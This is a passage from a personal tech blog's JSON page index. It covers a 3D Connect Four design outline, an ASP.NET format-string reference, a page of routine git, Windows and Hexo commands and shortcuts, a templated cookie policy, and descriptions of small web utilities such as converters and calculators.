Prompt","date":"un33fin33","updated":"un33fin33","comments":true,"path":"games/connected_4_3d/prompt.html","permalink":"https://neo01.com/games/connected_4_3d/prompt.html","excerpt":"","text":"Connected 4 in 3D: Technical Approach and Game Logic This document outlines the conceptual approach for building a 3D Connected 4 game for web browsers, focusing on a pure web-only implementation using JavaScript and Three.js for rendering. Part 1: Technical Approach (Web-Only with Three.js) The game will be a single-page web application built with HTML, CSS, and JavaScript. Three.js will be used for all 3D rendering. Proposed Architecture: HTML Structure (index.html): Will contain the canvas element for Three.js rendering. Will include basic UI elements for game status and controls (e.g., a reset button). Styling (style.css): Will provide basic styling for the HTML elements and the canvas. Game Logic and 3D Rendering (script.js): This single JavaScript file will encapsulate both the core game logic and the Three.js rendering. Three.js Setup: Initialize the 3D scene, camera, and WebGL renderer. 3D Board and Pieces: Create the 5x5x5 grid visually using Three.js geometries (e.g., cylinders for the board holes, spheres for the pieces). User Interaction: Implement mouse event listeners and Three.js raycasting to detect user clicks on the 3D board, translating screen coordinates to 3D grid positions. Game State Visualization: Update the 3D scene to reflect the current game state (e.g., adding a new piece, clearing the board). Workflow Example: Web Page Loads: index.html loads, style.css applies styling, and script.js executes. Three.js Scene Initialization: script.js sets up the Three.js scene, renders the empty 3D grid, and sets up event listeners. User Clicks on 3D Board: A mouse click event is detected. Raycasting: Three.js performs a raycast from the click position into the 3D scene to determine which grid cell (x, z) was targeted. Game Logic Processing: The JavaScript game logic receives the (x, z) coordinates, determines the y (vertical) position for the piece, updates its internal board state, and checks for win/draw conditions. 3D Scene Update: The JavaScript code instructs Three.js to add a new 3D piece at the calculated (x, y, z) coordinates with the current player’s color. Game Status Update: The HTML UI is updated to reflect the current game status (e.g., next player’s turn, win/draw message). Part 2: Core Game Logic (JavaScript) The core game logic for Connected 4 in 3D will be implemented in JavaScript. This logic manages the game state, player turns, piece placement rules, and win/draw conditions. The following outlines the current implementation of the core game logic: 1. Game Board Representation The 3D game board is represented as a 3-dimensional array of integers: let board; &#x2F;&#x2F; Will be initialized as new Array(5).fill(0).map(() &#x3D;&gt; new Array(5).fill(0).map(() &#x3D;&gt; new Array(5).fill(0))); board[x][y][z] represents a cell in the 5x5x5 cube. x, y, z range from 0 to 4. 0: Represents an empty cell. 1: Represents a piece placed by Player 1 (e.g., Red). 2: Represents a piece placed by Player 2 (e.g., Yellow). 2. Game State Management The game state is managed by several variables: let currentPlayer = 1;: Tracks whose turn it is (1 or 2). let gameOver = false;: Indicates if the game has ended (win or draw). let gameStatus = &quot;Player 1's Turn&quot;;: A string to display the current game status (e.g., “Player 1’s Turn”, “Player 2 Wins!”, “It’s a Draw!”). 3. Game Initialization (initializeGame()) This method sets up a new game: Resets the board to all zeros (empty). Sets currentPlayer back to 1. Sets gameOver to false. Updates gameStatus to “Player 1’s Turn”. Clears the 3D scene of all existing pieces. 4. Piece Placement Logic (addPiece(x, z))) This method handles placing a piece in the game: Input: Takes x (column) and z (depth) coordinates from user input. Game Over Check: If gameOver is true, the method returns immediately. Find Lowest Available y: It iterates from the bottom (y=0) upwards to find the first empty cell (board[x][i][z] == 0) in the selected column (x, z). This simulates gravity. Place Piece: If an empty y position is found: The board is updated with the currentPlayer’s value at board[x][y][z]. A new 3D piece is added to the Three.js scene at the calculated (x, y, z) coordinates with the current player’s color. Check Win/Draw Conditions: After placing a piece, it calls checkWin() and checkDraw() to determine the next game state. Update Game Status: Updates gameStatus based on the outcome (win, draw, or next player’s turn). Switch Player: If the game is not over, currentPlayer is switched to the other player. 5. Win Condition Check (checkWin(x, y, z)) This is the most complex part of the game logic. It checks for 4 consecutive pieces of the currentPlayer’s color in any of the 13 possible 3D directions, starting from the newly placed piece at (x, y, z). The 13 directions are: 3 Axial Directions: X-axis: (1, 0, 0) Y-axis: (0, 1, 0) Z-axis: (0, 0, 1) 6 Planar Diagonal Directions: XY-plane: (1, 1, 0), (1, -1, 0) XZ-plane: (1, 0, 1), (1, 0, -1) YZ-plane: (0, 1, 1), (0, 1, -1) 4 Space Diagonal Directions: (1, 1, 1) (1, 1, -1) (1, -1, 1) (1, -1, -1) The checkWin method calls checkLine for each of these directions. 6. Line Check (checkLine(x, y, z, dx, dy, dz)) This helper method checks for a win in a specific direction (dx, dy, dz) starting from a given (x, y, z) coordinate: It iterates along the line defined by the starting point and direction, checking up to 4 positions in both positive and negative directions from the starting point. It counts consecutive pieces of the currentPlayer’s color. If 4 or more consecutive pieces are found, it returns true (win). It handles boundary conditions (ensuring curX, curY, curZ stay within the 0-4 range). 7. Draw Condition Check (checkDraw()) This method determines if the game is a draw: It iterates through every cell on the board. If it finds any empty cell (0), it means the board is not full, and thus it’s not a draw, returning false. If all cells are filled (no 0 found), it returns true (draw). This detailed outline provides a clear understanding of the game’s structure and logic, which will be implemented using JavaScript and Three.js."},{"title":"Browser Text Summarizer Playground","date":"un66fin66","updated":"un66fin66","comments":true,"path":"ai/summary/index.html","permalink":"https://neo01.com/ai/summary/index.html","excerpt":"","text":"Prompt The quick brown fox jumps over the lazy dog. This is a sample text that demonstrates the summarization capabilities of Chrome's built-in AI. The text can be much longer and more complex, containing multiple paragraphs, technical details, and various topics that need to be condensed into a shorter, more digestible format. Token Usage: 0 Settings Summary Type: Key Points TL;DR Teaser Headline Length: Short Medium Long Format: Markdown Plain text Summary Enter text above to generate a summary... Summarization API is not supported in this browser. Please use Chrome Canary with AI features enabled. Summarization API is not available. Please check your browser settings."},{"title":"","date":"un55fin55","updated":"un55fin55","comments":true,"path":"games/connected_4_3d/test.html","permalink":"https://neo01.com/games/connected_4_3d/test.html","excerpt":"","text":"Game Logic Tests Game Logic Unit Tests Open the browser's developer console (F12) to see test results."},{"title":"ASP.NET string.Format","date":"un55fin55","updated":"un22fin22","comments":true,"path":"pages/useful-information/aspnet-string-format.html","permalink":"https://neo01.com/pages/useful-information/aspnet-string-format.html","excerpt":"","text":"{0:d} YY-MM-DD {0:p} 百分比00.00% {0:N2} 12.68 {0:N0} 13 {0:c2} $12.68 {0:d} 3/23/2003 {0:T} 12:00:00 AM DataGrid-數據格式設置表達式 數據格式設置表達式 .NET Framework 格式設置表達式，它在數據顯示在列中之前先應用于數據。此表達式由可選靜態文本和用以下格式表示的格式說明符組成： 零是參數索引，它指示列中要格式化的數據元素；因此，通常用零來指示第一個（且唯一的）元素。format specifier 前面有一個冒號 (😃，它由一個或多個字母組成，指示如何格式化數據。可以使用的格式說明符取決于要格式化的數據類型：日期、數字或其他類型。下表顯示了不同數據類型的格式設置表達式的示例。有關格式設置表達式的更多信息，請參見格式化類型。 Currency {0:C} numeric/decimal 顯示“Price:”，后跟以貨幣格式表示的數字。貨幣格式取決于通過 Page 指令或 Web.config 文件中的區域性屬性指定的區域性設置。 Integer {0:D4} 整數()不能和小數一起使用。) 在由零填充的四個字符寬的字段中顯示整數。 Numeric {0:N2}% 顯示精確到小數點后兩位的數字，后跟“%”。 Numeric/Decimal {0:000.0} 四舍五入到小數點后一位的數字。不到三位的數字用零填充。 Date/Datetime Long {0:D} 長日期格式（“Thursday, August 06, 1996”）。日期格式取決于頁或 Web.config 文件的區域性設置。 Date/Datetime short {0:d} 短日期格式（“12/31/99”）。 Date/Datetime customize {0:yy-MM-dd} 用數字的年－月－日表示的日期（96-08-06）。 2006-02-22 | asp.net數據格式的Format-- DataFormatString 我們在呈現數據的時候，不要將未經修飾過的數據呈現給使用者。例如金額一萬元，如果我們直接顯示「10000」，可能會導致使用者看成一千或十萬，造成使用者閱讀數據上的困擾。若我們將一萬元潤飾后輸出為「NT$10,000」，不但讓使比較好閱讀，也會讓使用者減少犯錯的機會。\\n下列畫面為潤飾過的結果： 上述數據除了將DataGrid Web 控件以顏色來區隔記錄外，最主要將日期、單價以及小計這三個計字段的數據修飾的更容易閱讀。要修飾字段的輸出，只要設定字段的DataFormatString 屬性即可；其使用語法如下： DataFormatString=&quot;{0:格式字符串}&quot; 我們知道在DataFormatString 中的 {0} 表示數據本身，而在冒號后面的格式字符串代表所們希望數據顯示的格式；另外在指定的格式符號后可以指定小數所要顯示的位數。例如原來的數據為「12.34」，若格式設定為 {0:N1}，則輸出為「12.3」。其常用的數值格式如下表所示：\\n\\n格式字符串 資料 結果 &quot;{0:C}&quot; 12345.6789 $12,345.68 &quot;{0:C}&quot; -12345.6789 ($12,345.68) &quot;{0:D}&quot; 12345 12345 &quot;{0:D8}&quot; 12345 00012345 &quot;{0:E}&quot; 12345.6789 1234568E+004 &quot;{0:E10}&quot; 12345.6789 1.2345678900E+004 &quot;{0:F}&quot; 12345.6789 12345.68 &quot;{0:F0}&quot; 12345.6789 12346 &quot;{0:G}&quot; 12345.6789 12345.6789 &quot;{0:G7}&quot; 123456789 1.234568E8 &quot;{0:N}&quot; 12345.6789 12,345.68 &quot;{0:N4}&quot; 123456789 123,456,789.0000 &quot;Total: {0:C}&quot; 12345.6789 Total: $12345.68 其常用的日期格式如下表所示： 格式 說明 輸出格式 d 精簡日期格式 MM/dd/yyyy D 詳細日期格式 dddd, MMMM dd, yyyy f 完整格式 (long date + short time) dddd, MMMM dd, yyyy HH:mm F 完整日期時間格式 (long date + long time) dddd, MMMM dd, yyyy HH:mm:ss g 一般格式 (short date + short time) MM/dd/yyyy HH:mm G 一般格式 (short date + long time) MM/dd/yyyy HH:mm:ss m,M 月日格式 MMMM dd\\ns 適中日期時間格式 yyyy-MM-dd HH:mm:ss t 精簡時間格式 HH:mm\\nT 詳細時間格式 HH:mm:ss string.format格式結果 String.Format © Currency: . . . . . . . . ($123.00) (D) Decimal:. . . . . . . . . -123 (E) Scientific: . . . . . . . -1.234500E+002 (F) Fixed point:. . . . . . . -123.45 (G) General:. . . . . . . . . -123 (N) Number: . . . . . . . . . -123.00 (P) Percent:. . . . . . . . . -12,345.00 % ® Round-trip: . . . . . . . -123.45 (X) Hexadecimal:. . . . . . . FFFFFF85 (d) Short date: . . . . . . . 6/26/2004 (D) Long date:. . . . . . . . Saturday, June 26, 2004 (t) Short time: . . . . . . . 8:11 PM (T) Long time:. . . . . . . . 8:11:04 PM (f) Full date/short time: . . Saturday, June 26, 2004 8:11 PM (F) Full date/long time:. . . Saturday, June 26, 2004 8:11:04 PM (g) General date/short time:. 6/26/2004 8:11 PM (G) General date/long time: . 6/26/2004 8:11:04 PM (M) Month:. . . . . . . . . . June 26 ® RFC1123:. . . . . . . . . Sat, 26 Jun 2004 20:11:04 GMT (s) Sortable: . . . . . . . . 2004-06-26T20:11:04 (u) Universal sortable: . . . 2004-06-26 20:11:04Z (invariant) (U) Universal sortable: . . . Sunday, June 27, 2004 3:11:04 AM (Y) Year: . . . . . . . . . . June, 2004 (G) General:. . . . . . . . . Green (F) Flags:. . . . . . . . . . Green (flags or integer) (D) Decimal number: . . . . . 3 (X) Hexadecimal:. . . . . . . 00000003 說明： String.Format 將指定的 String 中的每個格式項替換為相應對象的值的文本等效項。 例子： int iVisit = 100; string szName = &quot;Jackfled&quot;; Response.Write(String.Format(&quot;您的帳號是：{0} 。訪問了 {1} 次.&quot;, szName, iVisit));"},{"title":"Useful Tools","date":"un22fin22","updated":"un22fin22","comments":false,"path":"pages/useful-information/useful_tools.html","permalink":"https://neo01.com/pages/useful-information/useful_tools.html","excerpt":"","text":"asciinema - A tool to record ascii and playback. Useful for presentation. Cybersecurity Snort (IDS)"},{"title":"Learning Resources","date":"un22fin22","updated":"un22fin22","comments":false,"path":"pages/useful-information/learning.html","permalink":"https://neo01.com/pages/useful-information/learning.html","excerpt":"","text":"Architecture Microsoft Azure Architecture Center Coding CodeSchool CodeFight HackerRank CodeCombat CodinGame Learn Git Branching Learn Kubernetes using Interactive Browser-Based Scenarios Cybersecurity (ISC)2 International Information Systems Security Certification Consortium Others High Performance Browser Networking UN Climate Change Learning"},{"title":"Useful Information","date":"un22fin22","updated":"un22fin22","comments":false,"path":"pages/useful-information/index.html","permalink":"https://neo01.com/pages/useful-information/index.html","excerpt":"","text":"About This page contains useful information to myself. It also serve as a testing page for this blog. Frequently Used Prompt Convert a string from blog title to Linux friendly filename. convert string by replacing colon with dash, nonnalpha numeric with underscore. reduce repetiting underscore or dash to single underscore or dash: Software Development Security Instrumentation tookit Mask sensitive information such as Proxy-Authorization when running command, curl -v https://somewhere.need.authenticated.proxy 2&gt;&amp;1 | sed -E &quot;s/(proxy-authorization:).*/\\1: ***/i&quot; Nessus OWASP SANS Vulnerability Database Miscellaneous Creating an Alpine Linux package Visual Studio Code Keyboard Shortcuts for Windows Frequently Used Commands Shutdown Windows immediately shutdown -r -t 0, useful when you remote to a Windows PC Switch java version export JAVA_HOME&#x3D;&#96;&#x2F;usr&#x2F;libexec&#x2F;java_home -v 1.8&#96; Git Undo (Not pushed) git reset --soft HEAD~ Deleting a remote branch git push [remote] --delete [branch] e.g., git push origin --delete feature/branch Sync remote branch and delete remote non-existing local copy git fetch --prune List the commit different between branches git rev-list [branch]...[another branch] List the commit different between branches with arrow indicates which branch owns the commit git rev-list --left-right [branch]...[another branch] List the commit of a branch is ahead/behind to a remote branch git rev-list [branch]...[remote]/[another branch] Show the number of ahead of behind between branches git rev-list --left-right count [branch]...[another branch] Update submodules with latest commit git submodule update --remote Clean up orphan commits git gc --prune=now --aggressive Windows Remove XBox Remove XBox with Powershell Get-ProvisionedAppxPackage -Online | Where-Object &#123; $_.PackageName -match &quot;xbox&quot; &#125; | ForEach-Object &#123; Remove-ProvisionedAppxPackage -Online -AllUsers -PackageName $_.PackageName &#125; Check if any Xbox application is left dism /Online /Get-ProvisionedAppxPackages | Select-String PackageName | Select-String xbox Windows shortcuts Only those that are frequently used and easily forgotten are listed. Move Window to another monitor ⊞ Windows + ⇧ Shift + ← / → Switch to another desktop ⊞ Windows + ⌃ Control + ← / → Task View ⊞ Windows + Tab Open Action Center ⊞ Windows + A Display/Hide Desktop ⊞ Windows + D Open File Explorer ⊞ Windows + E Quick Link Menu (System tools such as Event Viewer) ⊞ Windows + X Lock ⊞ Windows + L Editing Switch Voice Typing ⊞ Windows + H Open Clipboard History ⊞ Windows + ⌃ Control + V Paste as plain text[1] ⊞ Windows + V[2] Capture screen and then OCR to clipboard[1:1] ⊞ Windows + T[2:1] Emoji ⊞ Windows + .[2:2] Visual Studio Code shortcuts Only those that are frequently used and easily forgotten are listed. Refernce from https://code.visualstudio.com/shortcuts/keyboard-shortcuts-windows.pdf Basic User Settings ⌃ Control + , Select all occurences of Find match Alt + Enter Quick Fix ⌃ Control&lt; + . Ctrl+K Ctrl+X ⌃ Control&lt; + K ⌃ Control&lt; + X Navigation Go to Line… ⌃ Control + G Go to File… ⌃ Control + P Go to next error or warning F8 Focus into 1st, 2nd or 3rd… editor group ⌃ Control + 1/2/3… Spit editor ⌃ Control + &lt;/kbd&gt; Show integrated termina ⌃ Control + ` Create new terminal ⌃ Control + ⇧ Shift + ` Show Explorer / Toggle focus ⌃ Control + ⇧ Shift + E Show Search ⌃ Control + ⇧ Shift + S Show Source Control ⌃ Control + ⇧ Shift + G Show Debug ⌃ Control + ⇧ Shift + D Show Extension ⌃ Control + ⇧ Shift + X Replace in files ⌃ Control + ⇧ Shift + H Show Output panel ⌃ Control + ⇧ Shift + U Open Markdown preview to the side ⌃ Control + K V Debug Toggle breakpoin F9 Start/Continue F5 Step over F10 Step into F11 Step out ⇧ Shift + F11 Others Guides Learning Tools Requires PowerToys ↩︎ ↩︎ Customized shortcut ↩︎ ↩︎ ↩︎"},{"title":"Guides","date":"un22fin22","updated":"un22fin22","comments":false,"path":"pages/useful-information/guides.html","permalink":"https://neo01.com/pages/useful-information/guides.html","excerpt":"","text":"Mac [Change Java version on MacOS] http://www.guigarage.com/2013/02/change-java-version-on-mac-os/ Others ASP.NET string.Format (Chinese)"},{"title":"Hexo Blogging Cheatsheet","date":"un44fin44","updated":"un55fin55","comments":false,"path":"pages/Hexo-Blogging-Cheatsheet/index.html","permalink":"https://neo01.com/pages/Hexo-Blogging-Cheatsheet/index.html","excerpt":"","text":"This page also used for testing components used in the posts and pages. Useful links Hexo Docs List of XML and HTML character entity references on Wikipedia My blog’s information Check if my domain is blocked in mainland Design Font Awesome Frequently used Emoji 😄 :D(shortcut) 😄 :smile: 😊 :blush: 😍 :heart_eyes: 😓 :sweat: 👍 :thumbsup: 😋 :yum: 😰 :cold_sweat: 😱 :scream: 😭 :sob: 😜 :stuck_out_tongue_winking_eye: 😗 :kissing: 😪 :sleepy: 💩 :poop: ✌️ :v: 💯 :100: 🙈 :see_no_evil: 🙉 :hear_no_evil: 🙊 :speak_no_evil: 💋 :kiss: 💀 :skull: 💧 :droplet: 🎆 :fireworks: 📢 :loudspeaker: ⚠️ :warning: 🚫 :no_entry_sign: ✅ :white_check_mark: ❌ :x: ㊙️ :secret: ⁉️ :interrobang: ‼️ :bangbang: and more from Emoji Cheatsheet CSS Keys Control &lt;kbd&gt;Contro&lt;/kbd&gt; Shift ⇧ &lt;kbd&gt;Shift &amp;#x21E7;&lt;/kbd&gt; - use Unicode characters Markdown (with plugins) ++Inserted++ Inserted Footnote [^1] for the mark[1], [^1]: for the note Use {% raw %}{% endraw %} if the markdown cause you trouble on {{}} or {%%} Youtube Video {% youtube [youtube id] %} Action Markdown Sample sub H~2~0 H20 sup x^2^ x2 Bold **bold** bold Italic *italic* italic Bold and Italic ***bold and italic*** bold and italic Marked ==marked== marked Strikethrough ~~strikethrough~~ strikethrough Inline code `inline code` inline code Link [link text](https://example.com) link text Image ![alt text](https://example.com/image.jpg) Attributes with style class, eg: # header &#123;.style-me&#125; paragraph &#123;data-toggle&#x3D;modal&#125; paragraph *style me*&#123;.red&#125; more text output &lt;h1 class&#x3D;&quot;style-me&quot;&gt;header&lt;&#x2F;h1&gt; &lt;p data-toggle&#x3D;&quot;modal&quot;&gt;paragraph&lt;&#x2F;p&gt; &lt;p&gt;paragraph &lt;em class&#x3D;&quot;red&quot;&gt;style me&lt;&#x2F;em&gt; more text&lt;&#x2F;p&gt; Table Column Alignment Code: | Default | Left | Center | Right | | --- | :-- | :-: | --: | | 1 | 1 | 1 | 1 | | 22 | 22 | 22 | 22 | | 333 | 333 | 333 | 333 | Result: Default Left Center Right 1 1 1 1 22 22 22 22 333 333 333 333 Blockquote Code: &gt; Some quote text Result: Some quote text Ordered list Code: 1. item 1 2. item 2 Result: item 1 item 2 Unordered list Code: - item 1 - item 2 Result: item 1 item 2 Horizontal rule Code: --- Result: Code block Result: Code block Code: ~~~ Code block ~~~ Github Card User Code: &#123;% githubCard user:neoalienson %&#125; neo.alienson @neoalienson 📍 Hong Kong 🔗 https://01man.com 📁 43 Repositories ⭐ 22 Stars 📈 34 Commits 👥 14 Followers 🔄 20 Pull Requests ❗ 0 Issues JavaScript 44.4% Swift 11.1% Dart 8.3% Python 8.3% TypeScript 8.3% Other 19.4% A repository Code: &#123;% githubCard user:neoalienson repo:pachinko %&#125; Result: 📖 neoalienson/pachinko An iOS 'pinball' game using SpriteKit and Swift with physics engine ⭐ 7 Stars 🍴 1 Forks Language: C++ Mermaid JS Prerendered. Code: &#123;% mermaid %&#125; block-beta columns 1 db((&quot;DB&quot;)) blockArrowId6&lt;[&quot;&nbsp;&nbsp;&nbsp;&quot;]&gt;(down) block:ID A B[&quot;A wide one in the middle&quot;] C end space D ID --&gt; D C --&gt; D style B fill:#969,stroke:#333,stroke-width:4px &#123;% endmermaid %&#125; Result: block-beta columns 1 db((\"DB\")) blockArrowId6(down) block:ID A B[\"A wide one in the middle\"] C end space D ID --> D C --> D style B fill:#969,stroke:#333,stroke-width:4px Live rendering block-beta columns 1 db((\"DB\")) blockArrowId6(down) block:ID A B[\"A wide one in the middle\"] C end space D ID --> D C --> D style B fill:#969,stroke:#333,stroke-width:4px Barchart Result: (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_f434721b7')); var option = { \"title\": { \"text\": \"Ephemeral Port Ranges by Operating System\" }, \"tooltip\": {}, \"xAxis\": { \"type\": \"category\", \"data\": [\"Linux (Old)\", \"Linux (New)\", \"Windows\", \"FreeBSD\", \"macOS\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"Number of Ports\" }, \"series\": [{ \"type\": \"bar\", \"data\": [28233, 28232, 16384, 55536, 16384], \"itemStyle\": { \"color\": \"#1976d2\" } }] }; chart.setOption(option); } })(); Code: &#123;% echarts %&#125; &#123; &quot;title&quot;: &#123; &quot;text&quot;: &quot;Ephemeral Port Ranges by Operating System&quot; &#125;, &quot;tooltip&quot;: &#123;&#125;, &quot;xAxis&quot;: &#123; &quot;type&quot;: &quot;category&quot;, &quot;data&quot;: [&quot;Linux (Old)&quot;, &quot;Linux (New)&quot;, &quot;Windows&quot;, &quot;FreeBSD&quot;, &quot;macOS&quot;] &#125;, &quot;yAxis&quot;: &#123; &quot;type&quot;: &quot;value&quot;, &quot;name&quot;: &quot;Number of Ports&quot; &#125;, &quot;series&quot;: [&#123; &quot;type&quot;: &quot;bar&quot;, &quot;data&quot;: [28233, 28232, 16384, 55536, 16384], &quot;itemStyle&quot;: &#123; &quot;color&quot;: &quot;#1976d2&quot; &#125; &#125;] &#125; &#123;% endecharts %&#125; Footnote sample ↩︎"},{"title":"ASCII Text Drawer","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/ascii-text-drawer/index.html","permalink":"https://neo01.com/tools/ascii-text-drawer/index.html","excerpt":"","text":"Text to convert: Font Category: Popular 3D & Effects Small & Compact Decorative Script & Cursive Tech & Digital Block & Solid Banner & Headers Monospace Themed & Special Geometric Retro & Vintage Stylized & Effects Artistic & Creative Money Fonts Named Fonts AMC Collection Efti Collection Miscellaneous All Fonts Copy to Clipboard"},{"title":"Chmod Calculator","date":"un00fin00","updated":"un00fin00","comments":true,"path":"tools/chmod-calculator/index.html","permalink":"https://neo01.com/tools/chmod-calculator/index.html","excerpt":"","text":"File Permissions: Owner Group Others Read Write Execute Copy Octal Notation 644 Copy Symbolic Notation rw-r--r-- Copy Umask 022 Or enter octal value:"},{"title":"Cookie Policy","date":"un11fin11","updated":"un66fin66","comments":true,"path":"pages/cookie-policy/index.html","permalink":"https://neo01.com/pages/cookie-policy/index.html","excerpt":"","text":"Last Updated: January 1, 2024 What Are Cookies Cookies are small text files stored on your device when you visit our website. They help us provide you with a better browsing experience and analyze how our site is used. Types of Cookies We Use Essential Cookies These cookies are necessary for the website to function properly and cannot be disabled. Session cookies: Maintain your session while browsing Security cookies: Protect against security threats Analytics Cookies These help us understand how visitors interact with our website. Google Analytics: Tracks page views, user behavior, and site performance Retention period: 26 months Functional Cookies These enhance your browsing experience. Preference cookies: Remember your settings and preferences Language cookies: Store your language preference Marketing Cookies These track your browsing habits to show relevant advertisements. Third-party advertising cookies: Used by advertising networks Social media cookies: Enable social sharing features Third-Party Cookies We may use third-party services that set their own cookies: Google Analytics Social media platforms (Twitter, Facebook, LinkedIn) Content delivery networks Your Cookie Choices Browser Settings You can control cookies through your browser settings: Chrome: Settings &gt; Privacy and Security &gt; Cookies Firefox: Options &gt; Privacy &amp; Security &gt; Cookies Safari: Preferences &gt; Privacy &gt; Cookies Edge: Settings &gt; Cookies and Site Permissions Opt-Out Options To opt out of non-essential cookies, simply click the “Reject” or “Decline” button in the cookie banner when you first visit our site. If the banner is not shown, clear your cookies and reload the page to see the banner again. Update Cookie Preferences: Click here to update your cookie preferences Legal Basis for Processing GDPR (EU) Essential cookies: Legitimate interest Analytics cookies: Consent Marketing cookies: Consent CCPA (California) You have the right to: Know what personal information is collected Delete personal information Opt-out of the sale of personal information Non-discrimination for exercising privacy rights International Compliance This policy complies with: EU GDPR (General Data Protection Regulation) UK GDPR and Data Protection Act 2018 CCPA (California Consumer Privacy Act) PIPEDA (Canada Personal Information Protection) LGPD (Brazil Lei Geral de Proteção de Dados) PDPA (Singapore Personal Data Protection Act) Data Retention Session cookies: Deleted when you close your browser Persistent cookies: Vary by type (30 days to 2 years) Analytics data: 26 months (Google Analytics default) Your Rights Depending on your location, you may have the right to: Access your personal data Rectify inaccurate data Erase your data (“right to be forgotten”) Restrict processing Data portability Object to processing Withdraw consent at any time Children’s Privacy Our website is intended for children under 16. We comply with applicable children’s privacy laws including COPPA when collecting information from children under 13. Cookie Consent Management When you first visit our site, you’ll see a cookie banner allowing you to: Accept all cookies Reject non-essential cookies If the banner is not shown, clear your cookies and reload the page. Updates to This Policy We may update this Cookie Policy periodically. Changes will be posted on this page with an updated “Last Updated” date. Contact Information For questions about this Cookie Policy or to exercise your rights: Email: [Insert your email] Address: [Insert your address] For EU residents, you may also contact our Data Protection Officer at [Insert DPO email]. Supervisory Authority If you’re in the EU and have concerns about our data practices, you can contact your local supervisory authority: List of EU Data Protection Authorities This Cookie Policy is designed to comply with international privacy laws. For specific legal advice, consult with a qualified attorney in your jurisdiction."},{"title":"Crontab Generator","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/crontab-generator/index.html","permalink":"https://neo01.com/tools/crontab-generator/index.html","excerpt":"","text":"Minute (0-59) Every minute 0 Every 5 minutes Every 10 minutes Every 15 minutes Every 30 minutes Hour (0-23) Every hour 0 (midnight) 6 AM 12 PM (noon) 6 PM Day (1-31) Every day 1st 15th Every 7 days Month (1-12) Every month January June December Weekday (0-7) Every day Sunday Monday Tuesday Wednesday Thursday Friday Saturday Copy Cron Expression * * * * * Runs every minute"},{"title":"Case Converter","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/case-converter/index.html","permalink":"https://neo01.com/tools/case-converter/index.html","excerpt":"","text":"Text to convert: Hello World! This is a Sample Text."},{"title":"Base64 Encoder/Decoder","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/base64-converter/index.html","permalink":"https://neo01.com/tools/base64-converter/index.html","excerpt":"","text":"URL Safe Input Text: Encode to Base64 Decode from Base64 Output: Copy"},{"title":"Hash Text","date":"un00fin00","updated":"un00fin00","comments":true,"path":"tools/hash-text/index.html","permalink":"https://neo01.com/tools/hash-text/index.html","excerpt":"","text":"Text to hash: Hello World!"},{"title":"Device Information","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/device-information/index.html","permalink":"https://neo01.com/tools/device-information/index.html","excerpt":"","text":""},{"title":"Chronometer","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/chronometer/index.html","permalink":"https://neo01.com/tools/chronometer/index.html","excerpt":"","text":"00:00:00.000 Start Pause Stop Reset Lap Lap Times"},{"title":"Emoji Picker","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/emoji-picker/index.html","permalink":"https://neo01.com/tools/emoji-picker/index.html","excerpt":"","text":"Emoji copied!"},{"title":"EXIF Extractor","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/exif-extractor/index.html","permalink":"https://neo01.com/tools/exif-extractor/index.html","excerpt":"","text":"Upload or drag and drop a JPEG image to extract and analyze its EXIF metadata information. 📁 Click here or drag and drop a JPEG file"},{"title":"IPv4 Subnet Calculator","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/ipv4-subnet-calculator/index.html","permalink":"https://neo01.com/tools/ipv4-subnet-calculator/index.html","excerpt":"","text":"IP Address with CIDR (e.g., 192.168.1.0/24): Class A (/8) Class B (/16) Class C (/24)"},{"title":"NATO Alphabet Converter","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/nato-alphabet/index.html","permalink":"https://neo01.com/tools/nato-alphabet/index.html","excerpt":"","text":"Text to convert to NATO alphabet: Hello World"},{"title":"JSON Validator & Formatter","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/json-validator/index.html","permalink":"https://neo01.com/tools/json-validator/index.html","excerpt":"","text":"Input JSON {\"name\":\"John\",\"age\":30,\"city\":\"New York\",\"hobbies\":[\"reading\",\"swimming\"]} Sort Keys: Indent: 2 spaces 4 spaces Tab Format Minify Clear Formatted Output Copy"},{"title":"SQL Prettify","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/sql-prettify/index.html","permalink":"https://neo01.com/tools/sql-prettify/index.html","excerpt":"","text":"SQL to format: SELECT u.id, u.name, p.title FROM users u JOIN posts p ON u.id = p.user_id WHERE u.active = 1 AND p.published = 1 ORDER BY p.created_at DESC; Keyword Case: UPPER lower Preserve Indent Style: Standard Tabular Left Tabular Right Format SQL Minify SQL Copy Formatted SQL"},{"title":"PNG Metadata Checker","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/png-metadata-checker/index.html","permalink":"https://neo01.com/tools/png-metadata-checker/index.html","excerpt":"","text":"Upload or drag and drop a PNG file to extract and analyze its metadata information. 📁 Click here or drag and drop a PNG file"},{"title":"Temperature Converter","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/temperature-converter/index.html","permalink":"https://neo01.com/tools/temperature-converter/index.html","excerpt":"","text":"Temperature value:"},{"title":"JSON to YAML Converter","date":"un00fin00","updated":"un00fin00","comments":true,"path":"tools/json-yaml-converter/index.html","permalink":"https://neo01.com/tools/json-yaml-converter/index.html","excerpt":"","text":"Pretty Format Input: JSON to YAML YAML to JSON Output: Copy"},{"title":"Mermaid Diagram Editor","date":"un00fin00","updated":"un00fin00","comments":true,"path":"tools/mermaid-editor/index.html","permalink":"https://neo01.com/tools/mermaid-editor/index.html","excerpt":"","text":"Mermaid Code Flowchart Sequence Gantt Pie Chart Class Diagram graph TD A[Start] --> B{Is it?} B -->|Yes| C[OK] C --> D[Rethink] D --> B B ---->|No| E[End] Render Clear Copy Code Diagram Output Zoom In Zoom Out Reset Zoom Download SVG Enter Mermaid code above and click Render to see the diagram..."},{"title":"Text Statistics","date":"un55fin55","updated":"un55fin55","comments":true,"path":"tools/text-statistics/index.html","permalink":"https://neo01.com/tools/text-statistics/index.html","excerpt":"","text":"Text to analyze: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna 